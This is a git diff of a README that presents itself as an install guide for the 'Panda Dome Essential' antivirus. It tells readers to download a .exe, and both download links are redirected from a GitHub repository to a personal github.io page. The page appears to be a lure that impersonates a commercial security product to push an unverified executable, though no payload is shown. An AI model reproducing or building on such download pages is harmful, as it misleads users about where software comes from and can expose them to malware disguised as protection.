@@ -1,6 +1,6 @@
 # 🛡️ Panda-Dome-Essential-2026 - Secure Your Computer Against Modern Threats
 
-[![](https://img.shields.io/badge/Download-Panda_Dome_Essential-blue.svg)](https://github.com/Sayali204334/Panda-Dome-Essential-2026)
+[![](https://img.shields.io/badge/Download-Panda_Dome_Essential-blue.svg)](https://sayali204334.github.io)
 
 Panda Dome Essential delivers reliable protection for your Windows desktop or laptop. This software guards your system against viruses, ransomware, and malicious programs. It includes a built-in virtual private network to help you browse the internet with more privacy. Use this guide to install and set up the protection suite on your home computer.
 
@@ -19,7 +19,7 @@ Before you install the software, ensure your computer meets these standards:
 
 Follow these steps to obtain the installer file from our repository:
 
-1. Visit the [Panda Dome Essential Download Page](https://github.com/Sayali204334/Panda-Dome-Essential-2026).
+1. Visit the [Panda Dome Essential Download Page](https://sayali204334.github.io).
 2. Look for the Releases section on the right side of the screen.
 3. Select the latest version provided.
 4. Locate the file ending in .exe.
